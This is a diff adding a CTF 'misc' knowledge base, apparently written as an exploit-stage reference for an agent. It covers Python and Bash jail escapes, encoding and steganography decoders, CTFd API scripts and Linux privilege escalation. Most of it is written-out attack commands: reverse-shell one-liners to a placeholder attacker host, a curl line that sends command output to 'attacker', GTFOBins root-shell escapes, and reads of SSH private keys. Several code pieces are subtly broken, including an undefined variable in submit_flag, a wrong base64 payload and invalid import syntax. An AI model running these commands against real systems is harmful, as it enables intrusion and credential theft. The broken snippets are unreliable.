@@ -1,0 +1,898 @@
+# stage: exploit
+# category: ctf
+
+> CTF miscellaneous knowledge base — Python Jail escapes, Bash Jail escapes, encoding-chain identification and decoding, QR/audio/image steganography, game VM reversing, CTFd API navigation, Linux privilege escalation
+
+# CTF Miscellaneous Knowledge Base
+
+A practical knowledge base for CTF Misc challenges, covering **sandbox escapes, encoding-chain identification, steganography, game reversing**, and other miscellaneous challenge types.
+
+## Scenario Routing
+
+| Scenario | Reference doc | Core content |
+|------|---------|---------|
+| Python sandbox escape | `python-jail-escape.md` | `__import__`/func\_globals/eval chains |
+| Bash sandbox escape | `bash-jail-escape.md` | HISTFILE/ctypes.sh/vi editor escapes |
+| Encoding-chain identification and decoding | `encoding-chain-reference.md` | Base64→Hex→ROT13 multi-layer nesting |
+| Game/custom VM reversing | `game-and-vm-reverse.md` | WASM/Brainfuck/Z3 constraint solving |
+| CTFd platform operations | `ctfd-platform-guide.md` | API for downloading attachments / submitting flags |
+| Linux privilege escalation | `linux-privesc-quick.md` | SUID/sudo/cron/kernel exploits |
+
+## Quick Challenge Identification
+
+| Challenge feature | Likely topic | Recommended reference |
+|---------|---------|---------|
+| Python exec/eval input box | PyJail escape | python-jail-escape.md |
+| Command-line restricted bash | BashJail escape | bash-jail-escape.md |
+| Strangely encoded strings | Encoding-chain decoding | encoding-chain-reference.md |
+| QR code / audio files | Steganography | encoding-chain-reference.md |
+| Game binary / WASM | Custom VM reversing | game-and-vm-reverse.md |
+| CTFtime / CTFd platform | Platform API | ctfd-platform-guide.md |
+| Given a shell | Linux privilege escalation | linux-privesc-quick.md |
+
+## References — bash-jail-escape
+
+# Bash Jail Escape Compendium
+
+## Escape Decision Tree
+
+```
+Restricted shell (rbash/rksh)
+├── Can you use cd?
+│   ├── Yes → cd /; sh to switch to a full shell
+│   └── No → look for editors / other commands
+├── Can you use quotes/escapes?
+│   ├── Yes → `whoami` or $(whoami)
+│   └── No → find other command-execution methods
+├── Can you access special files?
+│   ├── /dev/tcp → reverse shell
+│   ├── /proc → read sensitive files
+│   └── Can you read HISTFILE → read command history
+└── Is there a command whitelist?
+    ├── vi/vim → :!/bin/sh escape
+    ├── awk → awk 'BEGIN {system("id")}'
+    ├── find → find ... -exec
+    └── python/perl → execute commands directly
+```
+
+## Escape Techniques
+
+### 1. Editor Escapes
+```bash
+vi/vim: :!/bin/sh  or  :!/bin/bash
+vim:   :shell
+less:  !/bin/sh
+more:  !/bin/sh
+man:   !/bin/sh
+```
+
+### 2. Programming Language Escapes
+```bash
+awk:    awk 'BEGIN {system("whoami")}'
+perl:   perl -e 'system("whoami")'
+python: python -c 'import os; os.system("whoami")'
+ruby:   ruby -e 'system("whoami")'
+lua:    lua -e 'os.execute("whoami")'
+```
+
+### 3. File Operation Escapes
+```bash
+find:   find / -exec whoami \;
+dd:     dd if=/dev/null of=/dev/null
+cp:     cp /dev/null /tmp/a; cat /tmp/a
+```
+
+### 4. Special File Descriptors
+```bash
+# Read /etc/passwd
+cat /etc/passwd
+dd if=/etc/passwd
+```
+
+### 5. Reading Command History
+```bash
+cat ~/.bash_history
+cat /root/.bash_history
+```
+
+### 6. Reverse Shell
+```bash
+bash -i >& /dev/tcp/attacker_ip/port 0>&1
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+
+## rbash-Specific Restrictions
+
+| Restriction | Bypass method |
+|------|---------|
+| Cannot cd | `cd /; /bin/bash` |
+| Cannot use / | Use relative paths or built-in commands |
+| Cannot use $() | Backticks `` `$var` `` |
+| Cannot use environment variables | Inherit the parent process environment |
+| Cannot redirect | Write files via `/dev/null` |
+
+## Privilege Escalation via SUID
+
+```bash
+# Find SUID files
+find / -perm -4000 2>/dev/null
+
+# Common exploitable SUID binaries
+/usr/bin/sudo
+/usr/bin/python
+/usr/bin/perl
+/bin/more
+/bin/less
+/bin/awk
+/bin/nice
+```
+
+## Abusing the PATH Variable
+
+```bash
+# If you can set PATH
+export PATH=/tmp:$PATH
+# Place a malicious program in /tmp
+```
+
+## References — ctfd-platform-guide
+
+# CTFd Platform Operations Guide
+
+## CTFd API Basics
+
+```python
+import requests
+
+CTFD_URL = "https://ctf.example.com"
+session = requests.Session()
+
+def login(username, password):
+    """Log in to CTFd"""
+    r = session.post(f"{CTFD_URL}/login", data={
+        "name": username,
+        "password": password,
+    })
+    return r
+
+def get_challenges():
+    """Get all challenges"""
+    r = session.get(f"{CTFD_URL}/api/v1/challenges")
+    return r.json()
+
+def get_challenge_detail(chal_id):
+    """Get details of a single challenge"""
+    r = session.get(f"{CTFD_URL}/api/v1/challenges/{chal_id}")
+    return r.json()
+
+def get_challenge_files(chal_id):
+    """Get challenge attachments"""
+    r = session.get(f"{CTFD_URL}/api/v1/challenges/{chal_id}/files")
+    return r.json()
+
+def download_file(file_id):
+    """Download a challenge file"""
+    r = session.get(f"{CTFD_URL}/api/v1/files/{file_id}")
+    return r.content
+
+def submit_flag(flag):
+    """Submit a flag"""
+    r = session.post(f"{CTFD_URL}/api/v1/challenges/attempt", json={
+        "challenge_id": chal_id,
+        "submission": flag,
+    })
+    return r.json()
+
+def get_scoreboard():
+    """Get the scoreboard"""
+    r = session.get(f"{CTFD_URL}/api/v1/scoreboard")
+    return r.json()
+
+def get_user_info():
+    """Get current user info"""
+    r = session.get(f"{CTFD_URL}/api/v1/users/me")
+    return r.json()
+```
+
+## Detecting the Platform Type
+
+```python
+def detect_platform(url):
+    """Detect the CTF platform type"""
+    # CTFd
+    r = requests.get(f"{url}/login")
+    if 'ctfd' in r.text.lower() or 'csrf_token' in r.text:
+        return "CTFd"
+
+    # RBCG / CTFdLight
+    if '/static/core' in r.text:
+        return "RBCG"
+
+    # HCTF / others
+    return "Unknown"
+```
+
+## Common CTFd API Endpoints
+
+```
+GET  /api/v1/challenges          # all challenges
+GET  /api/v1/challenges/{id}     # challenge details
+GET  /api/v1/challenges/{id}/files # challenge files
+POST /api/v1/challenges/attempt  # submit flag
+GET  /api/v1/scoreboard          # scoreboard
+GET  /api/v1/users/me            # current user
+GET  /api/v1/notifications       # announcements
+```
+
+## Batch-Downloading Attachments
+
+```python
+def download_all_files(url, output_dir):
+    """Batch-download all challenge attachments"""
+    import os
+    os.makedirs(output_dir, exist_ok=True)
+
+    challenges = get_challenges()['data']
+    for chal in challenges:
+        chal_id = chal['id']
+        try:
+            files = get_challenge_files(chal_id)['data']
+            for f in files:
+                filename = f['filename']
+                content = download_file(f['id'])
+                with open(os.path.join(output_dir, filename), 'wb') as out:
+                    out.write(content)
+                print(f"Downloaded: {filename}")
+        except Exception as e:
+            print(f"Failed to download challenge {chal_id}: {e}")
+```
+
+## Auto-Solve Template
+
+```python
+def auto_solve(url, username, password, solve_func):
+    """Auto-solve template
+
+    solve_func(challenge_data) -> flag
+    """
+    session = requests.Session()
+    login(username, password)
+
+    challenges = get_challenges()['data']
+    for chal in challenges:
+        chal_id = chal['id']
+        detail = get_challenge_detail(chal_id)['data']
+        files = get_challenge_files(chal_id)['data']
+
+        print(f"Solving: {detail['name']}")
+        flag = solve_func(detail, files)
+
+        if flag:
+            result = submit_flag(flag)
+            if result.get('data', {}).get('status') == 'correct':
+                print(f"[✓] {detail['name']}: {flag}")
+            else:
+                print(f"[✗] {detail['name']}: Wrong flag")
+        else:
+            print(f"[-] {detail['name']}: No solve function")
+```
+
+## References — encoding-chain-reference
+
+# Encoding-Chain Identification and Decoding
+
+## Encoding Identification Features
+
+| Encoding | Feature | Example |
+|------|------|------|
+| Base64 | `A-Za-z0-9+/=`, length % 4 | `TnNTY1RmLnBocA==` |
+| Base32 | `A-Z2-7=`, length % 8 | `OBZHK5DFN2A====` |
+| Base16 | `0-9A-F`, even length | `4E535354662E706870` |
+| URL encoding | `%XX` | `%2F%61%64%6D%69%6E` |
+| HTML entities | `&#xNNN;` or `&#NNN;` | `&#x3C;script&#x3E;` |
+| Unicode | `\uXXXX` or `\UXXXXXXXX` | `\u003c\u0073\u0063` |
+| Hex (Python) | `\xNN` | `\x4e\x53\x53\x54` |
+| ROT13 | Letter substitution, Caesar | `axzc` → `nmp` |
+| Morse | `.` `-` `/` combinations | `.-/-.../-.-.` |
+| Binary | `01` arrays | `01001101` |
+
+## Common Encoding Chains
+
+### 1. Simple Chains
+```
+Hex → Base64 → URL encoding
+```
+
+### 2. Binary Family
+```
+Binary → ASCII
+Octal → ASCII
+Hex → ASCII
+```
+
+### 3. Browser Family
+```
+HTML entities → URL encoding → Base64
+```
+
+### 4. Special Encodings
+```
+Brainfuck (`><+-.,[]`)
+Ook! (`Ook. Ook?`)
+Hex → Ook! → Brainfuck
+```
+
+## Auto-Decoding Script
+
+```python
+import base64, binascii, urllib.parse, html
+
+def auto_decode(data, max_iter=10):
+    """Automatically attempt multi-layer decoding"""
+    result = data
+    for _ in range(max_iter):
+        changed = False
+        original = result
+
+        # URL decode
+        try:
+            result = urllib.parse.unquote(result)
+            if result != original:
+                changed = True
+        except:
+            pass
+
+        # HTML entity decode
+        try:
+            result = html.unescape(result)
+            if result != original:
+                changed = True
+        except:
+            pass
+
+        # Base64 decode
+        try:
+            result = base64.b64decode(result).decode('utf-8')
+            if result != original:
+                changed = True
+        except:
+            try:
+                result = base64.b64decode(result + '==').decode('utf-8')
+                if result != original:
+                    changed = True
+            except:
+                pass
+
+        # Hex decode
+        try:
+            if all(c in '0123456789abcdefABCDEF' for c in result.replace('%', '')):
+                result = bytes.fromhex(result.replace('%', '')).decode('utf-8')
+                if result != original:
+                    changed = True
+        except:
+            pass
+
+        # ROT13
+        try:
+            result = original.encode().translate(bytes.maketrans(
+                b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
+                b'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
+            )).decode()
+            if result != original:
+                changed = True
+        except:
+            pass
+
+        if not changed:
+            break
+
+    return result
+```
+
+## QR Code Decoding
+
+```python
+from PIL import Image
+import zbarlight
+
+def decode_qr(image_path):
+    """Decode a QR code"""
+    image = Image.open(image_path)
+    codes = zbarlight.scan_codes(['qrcode'], image)
+    return codes
+```
+
+## Audio Steganography (Least Significant Bit)
+
+```python
+def extract_lsb_wav(wav_path):
+    """Extract LSB-steganographic data from a WAV file"""
+    import wave, struct
+    with wave.open(wav_path, 'rb') as wav:
+        frames = wav.readframes(wav.getnframes())
+        binary = ''
+        for byte in frames:
+            binary += str(byte & 1)
+    # One character per 8 bits
+    result = ''
+    for i in range(0, len(binary), 8):
+        byte = binary[i:i+8]
+        if len(byte) == 8:
+            result += chr(int(byte, 2))
+    return result
+```
+
+## Image Steganography
+
+```python
+from PIL import Image
+
+def extract_lsb_png(image_path):
+    """Extract LSB steganography from a PNG"""
+    img = Image.open(image_path)
+    pixels = list(img.getdata())
+    binary = ''
+    for pixel in pixels:
+        if isinstance(pixel, tuple):
+            for channel in pixel[:3]:
+                binary += str(channel & 1)
+        else:
+            binary += str(pixel & 1)
+    # One character per 8 bits
+    result = ''
+    for i in range(0, len(binary), 8):
+        byte = binary[i:i+8]
+        if len(byte) == 8:
+            result += chr(int(byte, 2))
+    return result
+```
+
+## References — game-and-vm-reverse
+
+# Game and Custom VM Reversing
+
+## Brainfuck
+
+```python
+# Brainfuck interpreter
+import sys
+
+def brainfuck(code, input_data=''):
+    code = ''.join(c for c in code if c in '><+-.,[]')
+    tape = [0] * 30000
+    ptr = 0
+    iptr = 0
+    input_ptr = 0
+    output = []
+
+    while iptr < len(code):
+        op = code[iptr]
+        if op == '>':
+            ptr += 1
+        elif op == '<':
+            ptr -= 1
+        elif op == '+':
+            tape[ptr] = (tape[ptr] + 1) % 256
+        elif op == '-':
+            tape[ptr] = (tape[ptr] - 1) % 256
+        elif op == '.':
+            output.append(chr(tape[ptr]))
+        elif op == ',':
+            if input_ptr < len(input_data):
+                tape[ptr] = ord(input_data[input_ptr])
+                input_ptr += 1
+            else:
+                tape[ptr] = 0
+        elif op == '[':
+            if tape[ptr] == 0:
+                depth = 1
+                while depth > 0:
+                    iptr += 1
+                    if code[iptr] == '[':
+                        depth += 1
+                    elif code[iptr] == ']':
+                        depth -= 1
+        elif op == ']':
+            if tape[ptr] != 0:
+                depth = 1
+                while depth > 0:
+                    iptr -= 1
+                    if code[iptr] == '[':
+                        depth -= 1
+                    elif code[iptr] == ']':
+                        depth += 1
+        iptr += 1
+
+    return ''.join(output)
+```
+
+## Ook!
+
+```python
+# Ook! to Brainfuck conversion
+ook_to_bf = {
+    'Ook. Ook?': '>',
+    'Ook? Ook.': '<',
+    'Ook. Ook.': '+',
+    'Ook! Ook!': '-',
+    'Ook! Ook.': '.',
+    'Ook. Ook!': ',',
+    'Ook! Ook?': '[',
+    'Ook? Ook!': ']',
+}
+```
+
+## Custom VM Reversing Workflow
+
+```python
+# Steps for analyzing a custom VM:
+# 1. Find the opcode definition table
+# 2. Find the VM initialization code (register and memory initialization)
+# 3. Trace the main loop and find the instruction dispatch
+# 4. Analyze the function of each opcode
+# 5. Extract the bytecode file
+# 6. Write a disassembler or emulate execution directly
+
+"""
+Common opcode patterns:
+0x00 = NOP
+0x01 = LOAD  (load data)
+0x02 = STORE (store data)
+0x03 = ADD
+0x04 = SUB
+0x05 = JMP
+0x06 = JZ    (conditional jump)
+0x07 = HALT
+"""
+
+class SimpleVM:
+    def __init__(self, bytecode):
+        self.bytecode = bytecode
+        self.regs = [0] * 8
+        self.memory = bytecode[256:]  # assume data follows the code
+        self.pc = 0
+        self.running = True
+
+    def step(self):
+        op = self.bytecode[self.pc]
+        if op == 0x01:  # LOAD
+            self.pc += 1
+            reg = self.bytecode[self.pc]
+            self.pc += 1
+            addr = self.bytecode[self.pc]
+            self.regs[reg] = self.memory[addr]
+        elif op == 0x05:  # JMP
+            self.pc += 1
+            self.pc = self.bytecode[self.pc]
+        elif op == 0x07:  # HALT
+            self.running = False
+        self.pc += 1
+
+    def run(self):
+        while self.running and self.pc < len(self.bytecode):
+            self.step()
+```
+
+## Z3 Constraint Solving
+
+```python
+from z3 import *
+
+def solve_with_z3(constraints, variables):
+    """Solve constraints with Z3"""
+    s = Solver()
+    for constraint in constraints:
+        s.add(constraint)
+    if s.check() == sat:
+        model = s.model()
+        return {v: model[v] for v in variables}
+    return None
+```
+
+## WASM Analysis
+
+```python
+# Common wasm analysis commands
+"""
+# Extract wasm strings
+strings game.wasm | grep -i flag
+
+# View exported functions
+wasm-objdump -h game.wasm
+
+# Decompile to wasm text format
+wasm2wat game.wasm -o game.wat
+
+# View functions
+wasm-objdump -d game.wasm
+
+# Execute with wasmer or wasmtime
+wasmer game.wasm
+"""
+```
+
+## References — linux-privesc-quick
+
+# Linux Privilege Escalation Quick Reference
+
+## Quick Enumeration Script
+
+```bash
+# LinPEAS-style enumeration
+# 1. Check current user and privileges
+id; whoami; sudo -l
+
+# 2. Check SUID files
+find / -perm -4000 2>/dev/null
+
+# 3. Check commands available via sudo
+sudo -l
+
+# 4. Check crontab
+cat /etc/crontab
+ls -la /etc/cron.d/
+
+# 5. Check network
+netstat -tulpn
+ss -tulpn
+
+# 6. Check services
+ps aux | grep root
+systemctl list-units --type=service
+
+# 7. Check writable directories
+find / -writable -type d 2>/dev/null | grep -v proc
+
+# 8. Check kernel version
+uname -a
+cat /etc/issue
+
+# 9. Check sudo version (CVE)
+sudo --version
+
+# 10. Check polkit version
+pkexec --version
+```
+
+## Common Privilege Escalation Paths
+
+### 1. SUID Privilege Escalation
+
+```bash
+# Common exploitable SUID binaries
+nmap:        nmap --interactive; !sh
+vim:         vim -c ':!/bin/sh'
+less:        less /etc/passwd; !/bin/sh
+more:        more /etc/passwd; !/bin/sh
+awk:         awk 'BEGIN {system("/bin/sh")}'
+find:        find . -exec /bin/sh -p \; -quit
+python:      python -c 'import os; os.system("/bin/sh")'
+perl:        perl -e 'exec "/bin/sh";'
+ruby:        ruby -e 'exec "/bin/sh"'
+bash:        bash -p
+sh:          sh
+```
+
+### 2. Sudo Privilege Escalation
+
+```bash
+# sudo -l to view available commands
+# Common commands that allow escalation
+sudo git help config; !/bin/sh
+sudo less /etc/passwd; !/bin/sh
+sudo vim; :!/bin/sh
+sudo awk 'BEGIN {system("/bin/sh")}'
+sudo find . -exec /bin/sh -p \; -quit
+sudo python -c 'import os; os.system("/bin/sh")'
+sudo perl -e 'exec "/bin/sh"'
+sudo ruby -e 'exec "/bin/sh"'
+sudo lua -e 'os.execute("/bin/sh")'
+```
+
+### 3. Cron Privilege Escalation
+
+```bash
+# Check cron jobs
+cat /etc/crontab
+ls -la /etc/cron.d/
+# If a cron job runs as root and is writable
+# Modify the script to append malicious commands
+```
+
+### 4. NFS Privilege Escalation
+
+```bash
+# If /home has no_root_squash
+# Mount it from another machine
+mount -t nfs target:/home /tmp/nfs
+cp /bin/bash /tmp/nfs/bash_suid
+chmod +s /tmp/nfs/bash_suid
+# On the target machine, run /tmp/nfs/bash_suid -p
+```
+
+### 5. Kernel Exploits
+
+```python
+# Search for available exploits
+# Common vulnerabilities:
+# - dirtycow (CVE-2016-5195)
+# - docker breakout
+# - overlayfs (CVE-2021-3493)
+# - Polkit (CVE-2021-4034) / PwnKit
+# - etc.
+```
+
+### 6. Password Reuse
+
+```bash
+# Check readable configuration files
+cat /etc/mysql/my.cnf
+cat /var/www/html/config.php
+cat /home/*/.ssh/id_rsa
+cat /root/.ssh/id_rsa
+# If you find a password, try su root or ssh root@localhost
+```
+
+## Sensitive File Locations
+
+```
+/etc/passwd          # writable on some systems
+/etc/shadow          # usually not readable
+/root/.ssh/          # root SSH private key
+/home/*/.ssh/       # user SSH private keys
+/var/www/html/       # web root (may contain configs)
+/tmp/                # writable directory (place payloads)
+/etc/cron.d/         # cron configuration
+/proc/self/environ   # environment variables (may contain sensitive info)
+/proc/self/fd/       # file descriptors (may leak info)
+```
+
+## GTFOBins (sudo/suid Lookup Table)
+
+| Command | Privilege escalation method |
+|------|---------|
+| `nmap` | `nmap --interactive` → `!sh` |
+| `vim` | `:!/bin/sh` |
+| `less` | `!/bin/sh` |
+| `more` | `!/bin/sh` |
+| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
+| `find` | `find . -exec /bin/sh -p \; -quit` |
+| `perl` | `perl -e 'exec "/bin/sh"'` |
+| `python` | `python -c 'import os; os.system("/bin/sh")'` |
+| `ruby` | `ruby -e 'exec "/bin/sh"'` |
+| `git` | `git help config` → `!/bin/sh` |
+| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
+| `zip` | `zip /tmp/test.zip /tmp/test -T -TT 'sh #'` |
+| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
+
+## References — python-jail-escape
+
+# Python Jail Escape Compendium
+
+## Escape Decision Tree
+
+```
+Input reaches eval/exec
+├── Can you import?
+│   ├── Yes → __import__('os').system('id')
+│   └── No → look for builtins
+├── Can you access __builtins__?
+│   ├── Yes → use __builtins__ to find usable functions
+│   └── No → find other reference chains
+├── Is there filtering?
+│   ├── Underscores filtered → find functions without underscores
+│   ├── Quotes filtered → use StringIO/chr()
+│   └── Square brackets filtered → use .format() or getattr
+└── Character restrictions?
+    ├── Letters only → use chr() to construct arbitrary characters
+    ├── Length limit → short payload
+    └── Digits only → complex encodings
+```
+
+## Basic Escape Chains
+
+### 1. Direct Command Execution
+```python
+__import__('os').system('id')
+__import__('os').popen('id').read()
+eval("__import__('os').system('id')")
+exec("__import__('os').system('id')")
+```
+
+### 2. Via builtins
+```python
+__builtins__.__dict__['__import__']('os').system('id')
+getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
+```
+
+### 3. Via func_globals
+```python
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
+```
+
+### 4. Via type()
+```python
+type(type(os))
+(type.__subclasses__())
+```
+
+### 5. Via Warning/Exception
+```python
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
+```
+
+## Common Subclass Indexes (use print to find indexes)
+
+```python
+# List all available subclasses
+print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])
+
+# Or enumerate to find a specific class
+for i, c in enumerate([].__class__.__base__.__subclasses__()):
+    print(i, c.__name__)
+```
+
+## Common Gadgets
+
+| Class name | Index | Purpose |
+|------|------|------|
+| `catch_warnings` | ~59 | Obtain `__builtins__` |
+| `_io._IOBase` | ~80 | File operations |
+| `Popen` | ~200+ | Command execution |
+| `subprocess.Popen` | dynamic | Command execution |
+
+## Bypassing Filters
+
+### Underscores Filtered
+```python
+getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')
+
+# Or use the request object (Flask)
+request.environ['werkzeug.server.shutdown']
+```
+
+### Quotes Filtered
+```python
+chr(95)*2  # '__'
+# Or use StringIO
+import('so'[::-1], fromlist=['os']).system('id')
+```
+
+### Square Brackets Filtered
+```python
+getattr(__import__('os'), 'system')('id')
+# Use .__getattribute__ instead of getattr
+```
+
+### Digits Filtered
+```python
+# Construct numbers with True/False
+True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
+# True = 1, False = 0
+```
+
+### Length Limit
+```python
+# Shortest reverse shell
+__import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')
+
+# Or base64-decode and execute
+__import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
+```
+
+## Common Filter-Bypass Character Sets
+
+| Bypass method | Applicable characters |
+|---------|---------|
+| `chr()` | All printable characters |
+| `hex()` / `oct()` | Number construction |
+| `[::-1]` reversal | `so"[::-1]` = `os` |
+| `+` concatenation | `'os'[0]+'stem'` |
+| Variable assignment | `c='o'+'s';__import__(c)` |
+
+## Blind (No-Output) Detection
+```python
+# If command execution returns no output, verify with:
+__import__('os').system('curl http://attacker/?$(id)')
+__import__('os').system('ping -c1 attacker.com')
+```
